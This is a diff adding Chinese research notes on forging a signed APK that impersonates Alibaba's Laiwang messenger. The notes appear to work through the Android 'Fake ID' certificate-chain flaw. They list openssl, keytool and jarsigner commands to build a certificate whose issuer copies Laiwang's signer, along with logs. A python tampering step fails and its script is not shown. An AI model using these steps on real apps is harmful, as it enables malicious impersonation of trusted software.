@@ -1,0 +1,108 @@
+-------------
+日期：
+天气：
+星期：
+-------------
+正文
+-------------
+假设三方应用是来往
+写代码读取出来往的CA权证书的字段，如：Country Name、State等
+生成Keystore
+使用Keystore生成CSR证书请求文件
+
+
+测试：
+伪造一个来往包名的apk，安装必然会失败-原因签名一致，被视为是病毒。
+DEVICE SHELL COMMAND: pm install -r "/data/local/tmp/com.alibaba.mobileim"
+pkg: /data/local/tmp/com.alibaba.mobileim
+Failure [INSTALL_FAILED_CONTAIN_VIRUS]
+
+目标，伪造一个来往，能覆盖安装当前官方来往。
+
+指定4096大小的ca.key公钥
+openssl genrsa -out ca.key 4096
+
+指定生成1826大小的ca.crt私钥
+openssl req -new -x509 -days 1826 -key ca.key -out ca.crt
+
+生成私钥时，签名参数要与来往一致
+>>> 旺信的
+08-18 11:06:10.078  20376-20376/com.lichsword.androidclient.app D/MainActivity﹕ 证书内容:
+Certificate subject: CN=aliww, OU=aliyun, O=alibaba, L=hangzhou, ST=zhejiang
+Certificate issuer: CN=aliww, OU=aliyun, O=alibaba, L=hangzhou, ST=zhejiang
+Certificate serial number: 1282552562
+
+>>> 来往的
+08-18 16:16:22.013    6358-6358/? D/MainActivity﹕ 证书内容:
+Certificate subject: CN=xieqibao, O=alibaba, L=hangzhou
+Certificate issuer: CN=xieqibao, O=alibaba, L=hangzhou
+Certificate serial number: 1321865865
+
+CN=Common Name (e.g. server FQDN or YOUR name)
+ST=State Or Province Name
+L=Locality Name
+O=Organization Name
+OU=Organization Unit Name
+
+生成一个keystore，内容随便写
+keytool -genkey -v -keystore clientkeystore -alias CLIENT -keyalg RSA -keysize 2048 -validity 10000
+
+您的名字与姓氏是什么?
+  [简悦]:  
+您的组织单位名称是什么?
+  [简悦测试中心]:  
+您的组织名称是什么?
+  [简悦客户端测试]:  
+您所在的城市或区域名称是什么?
+  [杭州]:  
+您所在的省/市/自治区名称是什么?
+  [浙江]:  
+该单位的双字母国家/地区代码是什么?
+  [CN]:  
+CN=简悦, OU=简悦测试中心, O=简悦客户端测试, L=杭州, ST=浙江, C=CN是否正确?
+  [否]:  Y
+
+正在为以下对象生成 2,048 位RSA密钥对和自签名证书 (SHA256withRSA) (有效期为 10,000 天):
+  CN=简悦, OU=简悦测试中心, O=简悦客户端测试, L=杭州, ST=浙江, C=CN
+输入 <CLIENT> 的密钥口令
+        (如果和密钥库口令相同, 按回车):  
+[正在存储clientkeystore]
+
+用刚生成的keystore生成证书请求文件client.csr
+keytool -keystore clientkeystore -certreq -keysize 2048 -alias CLIENT -keyalg RSA -file client.csr
+
+利用CA签发CLIENT，得到client.cer
+openssl x509 -req -CA ca.crt -CAkey ca.key -in client.csr -out client.cer -days 10000 -CAcreateserial
+
+导入CA根证书和CLIENT二级证书
+keytool -import -keystore clientkeystore -file ca.crt -alias CA
+keytool -import -keystore clientkeystore -file client.cer -alias CLIENT
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+>>回显输出： 
+>>是否信任此证书? [否]:  Y
+>>证书已添加到密钥库中
+>>lichswordInc:fakeIdIssue lichsword$ keytool -import -keystore clientkeystore -file client.cer -alias CLIENT
+>>输入密钥库口令:  
+>>证书回复已安装在密钥库中
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+利用CLIENT对APK文件进行签名
+jarsigner -keystore clientkeystore -sigalg SHA1withRSA -digestalg SHA1 test.apk CLIENT
+
+也可以使用eclipse、AndroidStudio等IDE指定keystore，打包生成签名后的apk.
+此时这个apk是正确的，下一步要进行篡改RSA.
+
+过程中，python脚本在我的环境中缺少模块 pyasn1_modules
+Traceback (most recent call last):
+  File "work.py", line 6, in <module>
+      from pyasn1_modules import rfc2315, pem
+      ImportError: No module named pyasn1_modules
+      zip I/O error: No such file or directory
+      zip error: Could not create output file (../out/test.apk)
+      finish
+
+
+08-18 16:30:02.448    6358-6358/? D/MainActivity﹕ 证书内容:
+Certificate subject: CN=简悦, OU=简悦测试中心, O=简悦客户端测试, L=杭州, ST=浙江, C=CN
+Certificate issuer: CN=xieqibao, O=alibaba, L=hangzhou
+Certificate serial number: 12007428056746478179
